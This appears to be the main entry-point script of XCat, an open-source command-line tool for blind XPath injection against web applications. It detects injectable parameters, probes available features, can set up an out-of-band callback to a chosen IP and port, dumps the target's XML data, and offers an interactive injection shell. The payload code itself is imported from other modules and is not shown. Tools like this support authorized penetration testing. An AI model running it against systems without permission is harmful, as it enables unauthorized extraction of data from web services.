"""
XCat.

Usage:
    xcat <url> <target_parameter> [<parameters>]... (--true-string=<string> | --true-code=<code>) [--method=<method>]
         [--fast] [--oob-ip=<ip> (--oob-port=<port>)] [--stats] [--concurrency=<val>]
         [--features] [--body] [--cookie=<cookie>] [(--shell | --shellcmd=<cmd>)]
    xcat detectip

Options:
    -s, --shell                 Open the psudo-shell for exploring injections
    -S, --shellcmd=<cmd>        Execute a single shell command.
    -m, --method=<method>       HTTP method to use for requests [default: GET]
    -o, --oob-ip=<ip>           Use this IP for OOB injection attacks
    -p, --oob-port=<port>       Use this port for injection attacks
    -x, --concurrency=<val>     Make this many connections to the target server [default: 10]
    -b, --body                  Send the parameters in the request body as form data. Used with POST requests.
    -c, --cookie=<cookie>       A string that will be sent as the Cookie header
    -f, --fast                  Only fetch the first 15 characters of string values
    -t, --true-string=<string>  Interpret this string in the response body as being a truthful request. Negate with '!'
    -tc, --true-code=<code>     Interpret this status code as being truthful. Negate with '!'
    --stats                     Print statistics at the end of the session
"""
import asyncio
import operator
import sys
import time
from typing import Callable

import aiohttp
import docopt
import ipgetter
from aiohttp.web_response import Response

from xcat.algorithms import get_nodes
from xcat.display import display_xml
from xcat.features import detect_features
from xcat.payloads import detect_payload
from xcat.requester import Requester
from xcat.shell import run_shell, run_shell_command


def run():
    arguments = docopt.docopt(__doc__)

    if arguments['detectip']:
        print('Finding external IP address...')
        ip = ipgetter.myip()

        if ip:
            print(ip)
        else:
            print('Could not find external IP!')
        return

    match_function = make_match_function(arguments)

    url = arguments['<url>']
    target_parameter = arguments['<target_parameter>']
    parameters = arguments['<parameters>']

    oob_ip = arguments["--oob-ip"]
    oop_port = arguments["--oob-port"]

    shell = arguments['--shell']
    shell_cmd = arguments['--shellcmd']
    fast = arguments['--fast']
    stats = arguments['--stats']
    concurrency = arguments['--concurrency']
    method = arguments['--method']

    if concurrency:
        if not concurrency.isdigit():
            print('Error: Concurrency is not an integer', file=sys.stderr)
            return
        concurrency = int(concurrency)

    only_features = arguments['--features']
    body = arguments['--body']
    cookie = arguments['--cookie']

    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(start_action(url, target_parameter,
                                             parameters, match_function,
                                             oob_ip, oop_port,
                                             shell, shell_cmd, fast, stats, concurrency,
                                             only_features, body, cookie, method))
    except KeyboardInterrupt:
        loop.stop()


async def start_action(url, target_parameter, parameters, match_function, oob_ip, oob_port,
                       shell, shell_cmd, fast, stats, concurrency, only_features, body, cookie, method):
    async with aiohttp.ClientSession() as session:
        payload_requester = Requester(url, target_parameter, parameters, match_function,
                                      session, concurrency=concurrency, body=body, cookie=cookie, method=method)

        print("Detecting injection points...")
        payloads = await detect_payload(payload_requester)

        for payload in payloads:
            print(payload.name)
            print(' - Example: {payload.example}'.format(payload=payload))

        if not payloads:
            print("No payloads found! Perhaps the target is not injectable, or xcat just sucks")
            return
        elif len(payloads) > 1:
            print("Multiple payloads found! Please specify them via the command line. "
                  "In the future. When this is implemented.")
            return
        else:
            chosen_payload = payloads[0]

        requester = Requester(url, target_parameter, parameters, match_function, session,
                              injector=chosen_payload.payload_generator,
                              external_ip=oob_ip, external_port=oob_port,
                              fast=fast, concurrency=concurrency, body=body, cookie=cookie, method=method)

        print("Detecting Features...")
        features = await detect_features(requester)

        for feature, available in features:
            print(' - {feature.name} - {available}'.format(feature=feature,
                                                           available=available))
            requester.features[feature.name] = available

        if only_features:
            return

        try:
            if shell or shell_cmd:
                if shell:
                    await run_shell(requester)
                else:
                    await run_shell_command(requester, shell_cmd)
            else:
                t1 = time.time()
                await display_xml([await get_nodes(requester)])
                t2 = time.time()
                print('Total Time: {time} seconds'.format(time=round(t2-t1)))
            print('Total Requests: {requester.total_requests}'.format(requester=requester))
        finally:
            await requester.stop_oob_server()

        if stats:
            print('Stats:')
            for name, counter in requester.counters.items():
                print('{name}:'.format(name=name))
                for name, value in counter.most_common(10):
                    print(' - {name} {value}'.format(name=name, value=value))


def make_match_function(arguments) -> Callable[[Response, str], bool]:
    true_code, true_code_invert = arguments['--true-code'] or '', False

    if true_code.startswith('!'):
        true_code_invert = True
        true_code = true_code[1:]

    if true_code:
        true_code = int(true_code)

    true_string, true_string_invert = arguments['--true-string'] or '', False

    if true_string.startswith('!'):
        true_string_invert = True
        true_string = true_string[1:]

    match_operator = operator.ne if true_code_invert or true_string_invert else operator.eq

    def response_checker(response: Response, content: str) -> bool:
        if true_code:
            match = match_operator(response.status, true_code)
        else:
            match = match_operator(true_string in content, True)

        return match

    return response_checker


if __name__ == "__main__":
    run()
